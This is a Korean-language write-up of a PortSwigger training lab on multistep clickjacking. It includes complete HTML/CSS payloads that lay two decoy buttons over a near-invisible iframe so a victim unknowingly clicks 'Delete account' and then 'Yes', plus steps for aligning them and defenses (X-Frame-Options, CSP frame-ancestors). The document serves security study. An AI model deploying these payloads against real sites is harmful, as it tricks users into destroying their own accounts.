# Lab: Multistep clickjacking

## 개요

- **난이도**: Practitioner
- **주제**: Clickjacking — 다단계 클릭 유도 / 복수 decoy 요소
- **링크**: https://portswigger.net/web-security/clickjacking/lab-multistep

## 목표

계정 삭제가 "Delete account" → "Yes" 확인 버튼의 2단계 클릭으로 구성된 사이트에서, 두 개의 decoy 요소를 순서대로 클릭하게 유도하여 계정을 삭제한다.

## 이전 랩들과의 차이

```
[001~004 랩 — 단일 클릭]
  decoy 요소 1개
  피해자가 한 번 클릭 → 공격 완료

[005 랩 (이번) — 다단계 클릭]
  decoy 요소 2개
  피해자가 순서대로 두 번 클릭 → 공격 완료

  1번 클릭: "Click me first!" → Delete account 버튼
  2번 클릭: "Click me next!" → Yes 확인 버튼
```

## 2단계 클릭이 필요한 이유

```
계정 삭제 플로우:
  1. /my-account 페이지 → "Delete account" 버튼 클릭
                          ↓
  2. 확인 페이지/다이얼로그 → "Yes" 버튼 클릭
                          ↓
  3. 계정 삭제 완료

→ 1번 클릭 후 페이지가 변경되어 "Yes" 버튼이 나타남
→ 두 번째 decoy 가 새로 나타난 "Yes" 버튼 위치에 있어야 함
```

## 공격 방법

### 위치 조정 (opacity 0.5)

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.5;    /* 위치 확인용 */
        z-index: 2;
    }
    #first {
        position: absolute;
        top: 500px;      /* Delete account 버튼 위치 */
        left: 50px;
        z-index: 1;
    }
    #second {
        position: absolute;
        top: 300px;      /* Yes 확인 버튼 위치 */
        left: 225px;
        z-index: 1;
    }
</style>

<div id="first">Click me first!</div>
<div id="second">Click me next!</div>
<iframe src="https://VULNERABLE.com/my-account"></iframe>
```

### 최종 페이로드 (opacity 0.0001)

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    #first {
        position: absolute;
        top: 500px;
        left: 50px;
        z-index: 1;
    }
    #second {
        position: absolute;
        top: 300px;
        left: 225px;
        z-index: 1;
    }
</style>

<div id="first">Click me first!</div>
<div id="second">Click me next!</div>
<iframe src="https://VULNERABLE.com/my-account"></iframe>
```

### 실행 흐름

```
1. 피해자: exploit 페이지 방문
   → "Click me first!", "Click me next!" 두 버튼이 보임
   → 투명 iframe 이 위에 겹쳐 있음

2. 피해자: "Click me first!" 클릭
   → 실제로는 iframe 안의 "Delete account" 클릭
   → 페이지가 확인 화면으로 전환 (iframe 내부)

3. 피해자: "Click me next!" 클릭
   → 실제로는 확인 화면의 "Yes" 버튼 클릭
   → 계정 삭제 완료
```

## 위치 조정 팁

```
두 버튼의 위치가 서로 다른 페이지에 있으므로 각각 맞춰야 함:

#first  → /my-account 페이지의 Delete account 버튼
#second → 클릭 후 나타나는 확인 페이지의 Yes 버튼

조정 순서:
  1. opacity: 0.5 로 설정 후 View exploit
  2. #first 위치를 Delete account 버튼에 맞춤
  3. iframe 내부에서 Delete account 를 직접 클릭해 확인 화면 진입
  4. #second 위치를 Yes 버튼에 맞춤
  5. 모두 맞으면 opacity: 0.0001 로 변경 후 Deliver to victim
```

## 이전 랩들 종합 비교

| 랩 | 클릭 수 | 추가 기법 | decoy 수 |
|----|--------|---------|---------|
| 001 | 1 | CSRF 토큰 (무의미) | 1 |
| 002 | 1 | URL 파라미터 사전 입력 | 1 |
| 003 | 1 | sandbox="allow-forms" (Frame Buster 우회) | 1 |
| 004 | 1 | DOM XSS 트리거 | 1 |
| 005 | 2 | 없음 (다단계 클릭만) | 2 |

## 핵심 정리

- 다단계 확인 절차가 있어도 decoy 요소를 여러 개 배치하면 클릭재킹으로 우회 가능하다.
- 두 번째 decoy는 첫 번째 클릭 후 변경된 페이지 기준으로 위치를 맞춰야 한다.
- **방어**: `X-Frame-Options: DENY` / `CSP: frame-ancestors 'none'` — 확인 단계를 몇 번 추가해도 iframe 자체를 차단하지 않으면 다단계 클릭재킹으로 우회 가능하다.
